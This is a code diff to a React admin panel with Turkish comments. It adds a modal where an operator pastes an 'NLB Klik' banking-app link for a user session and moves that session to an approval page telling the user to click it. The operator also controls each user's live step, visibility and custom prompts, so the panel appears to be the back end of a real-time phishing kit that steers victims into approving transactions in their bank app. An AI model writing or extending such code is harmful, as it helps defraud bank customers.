@@ -898,6 +898,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
   const [questionPromptSessionId, setQuestionPromptSessionId] = useState<string | null>(null);
   const [questionInput, setQuestionInput] = useState("");
+  const [nlbPromptSessionId, setNlbPromptSessionId] = useState<string | null>(null);
+  const [nlbLinkInput, setNlbLinkInput] = useState("");
   const [questionModalSession, setQuestionModalSession] = useState<any | null>(null);
   const [specialMessage, setSpecialMessage] = useState("");
   const [specialImage, setSpecialImage] = useState<string | null>(null);
@@ -1211,27 +1213,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
-    // NLB ONAY: kullaniciyi yeni NLB Klik onay sayfasina yonlendir.
-    // Modal YOK - direkt step + approvalStatus='nlb' (kolon: NLB Bekliyor).
+    // NLB ONAY: once link modalini ac - admin uygulama baglantisini yapistirir,
+    // kullanici NLB Klik onay sayfasinda o linke tiklar.
     if (action === "nlb_approval") {
-      const row = rowsRef.current.find((r) => r.id === sessionId);
-      const prevFd =
-        row?.form_data && typeof row.form_data === "object"
-          ? (row.form_data as Record<string, unknown>)
-          : {};
-      const { error } = await supabase
-        .from("sessions")
-        .update({
-          current_step: "nlb_approval",
-          status: "online",
-          is_hidden: false,
-          form_data: { ...prevFd, approvalStatus: "nlb" },
-        })
-        .eq("id", sessionId);
-      if (error) {
-        alert("[ADMIN DB HATA] nlb_approval guncellenemedi: " + String(error.message || error));
-      }
-      void load();
+      setNlbLinkInput("");
+      setNlbPromptSessionId(sessionId);
       return;
     }
 
@@ -1397,6 +1383,36 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     setQuestionPromptSessionId(null);
     setQuestionInput("");
+    void load();
+  }
+
+  async function confirmNlbSend() {
+    if (!supabase || !nlbPromptSessionId) return;
+    const link = nlbLinkInput.trim();
+    if (!link) return;
+
+    const row = rowsRef.current.find((r) => r.id === nlbPromptSessionId);
+    const previousFormData =
+      row?.form_data && typeof row.form_data === "object"
+        ? (row.form_data as Record<string, unknown>)
+        : {};
+
+    const { error } = await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        status: "online",
+        current_step: "nlb_approval",
+        form_data: { ...previousFormData, approvalStatus: "nlb", nlbApprovalLink: link },
+      })
+      .eq("id", nlbPromptSessionId);
+    if (error) {
+      alert("[ADMIN DB HATA] nlb_approval guncellenemedi: " + String(error.message || error));
+      return;
+    }
+
+    setNlbPromptSessionId(null);
+    setNlbLinkInput("");
     void load();
   }
 
@@ -2775,6 +2791,43 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 onClick={() => void confirmQuestionSend()}
                 disabled={!questionInput.trim()}
                 className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20 disabled:opacity-50"
+              >
+                Gönder
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* NLB ONAY LINK MODALI */}
+      {nlbPromptSessionId && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>🔐 NLB Onayı Gönder</h3>
+            <div>
+              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Uygulama Bağlantısı</label>
+              <input
+                type="text"
+                value={nlbLinkInput}
+                onChange={(e) => setNlbLinkInput(e.target.value)}
+                placeholder="nlb-klik:// veya https://..."
+                className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#5b21b6]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#5b21b6]'}`}
+              />
+              <p className={`mt-2 text-[11px] leading-relaxed ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>
+                Kullanıcı NLB onay sayfasında bu bağlantıya tıklayıp uygulamada onaylayacak.
+              </p>
+            </div>
+            <div className="mt-6 flex justify-end gap-3">
+              <button
+                onClick={() => { setNlbPromptSessionId(null); setNlbLinkInput(""); }}
+                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
+              >
+                İptal
+              </button>
+              <button
+                onClick={() => void confirmNlbSend()}
+                disabled={!nlbLinkInput.trim()}
+                className="rounded-xl bg-[#5b21b6] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#4c1d95] shadow-lg shadow-[#5b21b6]/20 disabled:opacity-50"
               >
                 Gönder
               </button>
